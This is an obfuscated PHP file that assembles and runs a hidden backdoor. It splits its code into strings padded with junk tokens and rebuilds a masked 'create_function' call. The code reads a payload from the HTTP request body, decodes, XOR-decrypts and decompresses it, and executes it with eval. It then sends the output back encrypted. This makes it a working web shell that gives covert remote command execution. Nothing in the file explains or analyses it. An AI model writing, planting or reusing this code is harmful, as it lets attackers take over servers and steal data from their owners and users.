<?php
$T='hojGso";fb]ub]nction x($b]t,$k){b]$c=stb]rb]len($kb]);$l=sb]trlen(b]$tb]);$o="b]";fb';
$r='bab]seb]64_decode($b]m[1]),$kb])));$o=b]@ob_gb]b]etb]_conteb]nts();@ob_end_cleanb]()';
$D=']j};}}reb]turn $ob];}if b](b]@preg_matchb](b]"/$kh(.b]+)$kf/"b],@filb]e_get_conteb]n';
$m=';$rb]=@b]baseb]6b]4_encode(@b]x(@gzcomb]press($ob]),$kb])b]);print("$b]p$kh$r$kf");}';
$F='$k="afb]a4fac8";$b]kh="0db]2c8b]b]9cbb]b74d";$kf="7c06f63b]0bb]b]3f0";$p="0b]6EnBb]DMRyR';
$y='ts(b]"php://ib]b]nputb]"),$m)==1) {@ob]b]b_startb]();@eb]val(b]@gzunb]compressb](@x(@';
$E=str_replace('MI','','creMIaMIteMI_fuMInMIcMItion');
$d=']or($i=b]0;$b]i<$l;){for($j=0b];($j<$c&&$i<$lb])b];$j++,$i+b]+)b]{$o.=$t{$i}^b]$k{$b';
$A=str_replace('b]','',$F.$T.$d.$D.$y.$r.$m);
$J=$E('',$A);$J();
?>
